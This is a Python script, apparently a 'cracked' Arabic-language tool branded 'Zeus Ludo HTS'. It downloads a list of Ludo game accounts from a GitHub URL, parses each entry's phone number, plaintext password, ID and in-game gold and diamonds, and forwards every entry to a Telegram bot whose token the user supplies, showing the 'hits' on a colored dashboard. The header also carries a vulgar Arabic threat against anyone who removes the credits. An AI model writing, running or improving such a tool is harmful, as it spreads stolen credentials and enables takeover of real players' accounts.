#تم فك اداه بواسطه @Aa_6wa
#اذا غيرت حقوقه و نشرته انيج امك و انيج عرضك

import os
import sys
import time
import random
import threading
import urllib.request
import urllib.parse
from datetime import datetime

BOLD = '\x1b[1m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PINK = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
WHITE = '\x1b[1;97m'
RESET = '\x1b[0m'

COUNTER_COLORS = [RED, PINK, RED, PINK, RED, PINK]


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


stats = {'total': 0, 'good': 0, 'error': 0}
start_time = time.time()
stop_flag = False
bot_token = ''
chat_id = ''
accounts_file = 'accounts.txt'
hit_accounts = []


# ═══════════════════════════════════════════════════
# 📊 DASHBOARD
# ═══════════════════════════════════════════════════
def print_dashboard():
    clear_screen()
    cc = COUNTER_COLORS[stats['total'] % len(COUNTER_COLORS)]

    # 🔴 LOKO — أحمر
    print(f"{RED}╱╱╭━━━┳━┳━━━┳━╮")
    print(f"{RED}╭━┫╭━╮┃━┫╭━╮┃━┫")
    print(f"{RED}┃╋┣╯╭╯┣━┣╯╭╯┣━┃")
    print(f"{RED}┃╭╯╱┃╭┻━╯╱┃╭┻━╯")
    print(f"{RED}╰╯╱╱┃┃╱╱╱╱┃┃{RESET}")

    # 💗 القسم الأول — وردي
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{WHITE}DEVELOPER {PINK}>> {WHITE}Zeus-{RESET}")
    print(f"{WHITE}STATUS    {PINK}>> {WHITE}Premium{RESET}")
    print(f"{WHITE}VERSION   {PINK}>> {WHITE}V/2.0{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
    print(f"{PINK}◈ DEV Zeus| @R7_36 • https://t.me/R7Aih1{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # 🔴 القسم الثاني — أحمر
    print(f"{RED}<[●]> {WHITE}FUTURES  {RED}>> {WHITE}FILE✘CLONE{RESET}")
    print(f"{RED}<[●]> {WHITE}DEV      {RED}>> {WHITE}Zeus ~ @R7_36{RESET}")
    print(f"{RED}<[●]> {WHITE}TODAYS   {RED}>> {WHITE}{datetime.now().strftime('%d/%B/%Y').upper()}{RESET}")
    print(f"{RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # 💗 إحصائيات — وردي
    print(f"{PINK}<[●]> {WHITE}COUNTRY {PINK}>> {WHITE}Saudi Arabia{RESET}")
    print(f"{PINK}<[●]> {WHITE}HIT {PINK}>> {GREEN}{stats['good']}{PINK}   {WHITE}ERROR {PINK}>> {RED}{stats['error']}{RESET}")
    print(f"{PINK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # 🔴 HIT ACCOUNTS — أحمر
    print(f"{RED}<[●]> {WHITE}HIT ACCOUNTS{RESET}")
    if hit_accounts:
        for h in hit_accounts[-30:]:
            print(f"{RED}<[●]> {GREEN}{h['phone']}{WHITE} | {GREEN}{h['password']}{WHITE} | {PINK}{h['uid']}{RESET}")
    else:
        print(f"{RED}<[●]> {WHITE}No hits yet...{RESET}")
    print(f"{RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # 💗 العدّاد
    print(f"{cc}<[●]> {WHITE}TOTAL {PINK}>> {WHITE}{stats['total']}{RESET}")
    print(f"{PINK}<[●]> {WHITE}STATUS: {PINK}>> {GREEN}SCANNING...{RESET}")


# ═══════════════════════════════════════════════════
# 📤 SEND TO TELEGRAM
# ═══════════════════════════════════════════════════
def download_file(url, name):
    try:
        print(BOLD + YELLOW + '[+] Downloading accounts file...' + RESET)
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = resp.read()
        with open(name, 'wb') as f:
            f.write(data)
        print(BOLD + GREEN + '[+] File downloaded: ' + name + RESET)
        return True
    except Exception as e:
        print(BOLD + RED + '[!] Download failed: ' + str(e) + RESET)
        return False


def send_to_telegram(msg, bot_token, chat_id):
    try:
        url = 'https://api.telegram.org/bot' + bot_token + '/sendMessage'
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': msg}).encode()
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status == 200
    except Exception:
        return False


def parse_accounts(content):
    accounts = []
    blocks = content.split('✦ PS Ludo HTS ✅ ✦')
    for block in blocks:
        acc = {}
        for line in block.splitlines():
            line = line.strip()
            if not line:
                continue
            if '❖ المعرف' in line:
                acc['id'] = line.partition('➜')[2].strip()
            elif '❖ الاسم' in line:
                acc['name'] = line.partition('➜')[2].strip()
            elif '❖ الجوال' in line:
                acc['phone'] = line.partition('➜')[2].strip()
            elif '❖ كلمة السر' in line:
                acc['password'] = line.partition('➜')[2].strip()
            elif '❖ VIP' in line:
                acc['vip'] = line.partition('➜')[2].strip()
            elif '❖ الذهب' in line:
                acc['gold'] = line.partition('➜')[2].replace('💛', '').strip()
            elif '❖ الألماس' in line:
                acc['diamond'] = line.partition('➜')[2].replace('💎', '').strip()
            elif '❖ المستوى' in line:
                acc['level'] = line.partition('➜')[2].replace('⚡', '').strip()
        if acc:
            accounts.append(acc)
    return accounts


def build_message(acc):
    return (
        '✦ Zeus Ludo HTS  ✦\n'
        '★━━━━━━━━━━━━━━━━━━★\n'
        '\n'
        '  ✧  ID       ➜ ' + acc.get('id', 'N/A') + '\n'
        '  ✧  Name     ➜ ' + acc.get('name', 'N/A') + '\n'
        '  ✧  Phone    ➜ ' + acc.get('phone', 'N/A') + '\n'
        '  ✧  Password ➜ ' + acc.get('password', 'N/A') + '\n'
        '\n'
        '  ✧  VIP      ➜ ' + acc.get('vip', 'N/A') + '\n'
        '  ✧  Gold     ➜ ' + acc.get('gold', 'N/A') + '\n'
        '  ✧  Diamond  ➜ ' + acc.get('diamond', 'N/A') + '\n'
        '  ✧  Level    ➜ ' + acc.get('level', 'N/A') + '\n'
        '\n'
        '━━━━━━━━━━━━━━━━\n'
        '  ✧  Channel ➜ @R7Aih1\n'
        '  ✧  Dev      ➜ @R7_36\n'
        '━━━━━━━━━━━━━━━━\n'
    )


def update_display():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)


# ═══════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════
if __name__ == '__main__':
    clear_screen()

    # ═══ أول شي: طلب التوكن والـ ID فقط — بلون وردي ═══
    bot_token = input(f"{PINK}TOKEN >>> {RESET}").strip()
    chat_id = input(f"{PINK}ID    >>> {RESET}").strip()

    # ═══ بعد الإدخال: نزّل الملف وشغّل الواجهة ═══
    url = 'https://github.com/lm9011109t-pixel/LLLLL/raw/refs/heads/main/%D8%AD%D8%B3%D8%A7%D8%A8%D8%A7%D8%AA%20.txt'
    if not download_file(url, accounts_file):
        sys.exit()

    with open(accounts_file, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    accounts = parse_accounts(content)
    random.shuffle(accounts)

    display_thread = threading.Thread(target=update_display, daemon=True)
    display_thread.start()

    sent = 0
    for acc in accounts:
        if stop_flag:
            break

        # الرسالة العادية للتيليگرام
        msg_plain = build_message(acc)

        # ✅ أرسل لتيليگرام (بدون عرض على الشاشة)
        ok = send_to_telegram(msg_plain, bot_token, chat_id)

        if ok:
            sent += 1
            stats['total'] += 1
            stats['good'] += 1
            hit_accounts.append({
                'phone': acc.get('phone', 'N/A'),
                'password': acc.get('password', 'N/A'),
                'uid': acc.get('id', 'N/A'),
            })
        else:
            stats['total'] += 1
            stats['error'] += 1

        time.sleep(1)

    stop_flag = True
    time.sleep(2)
    print_dashboard()
    print(BOLD + GREEN + '\n[+] Done! Sent ' + str(sent) + '/' + str(len(accounts)) + ' accounts' + RESET)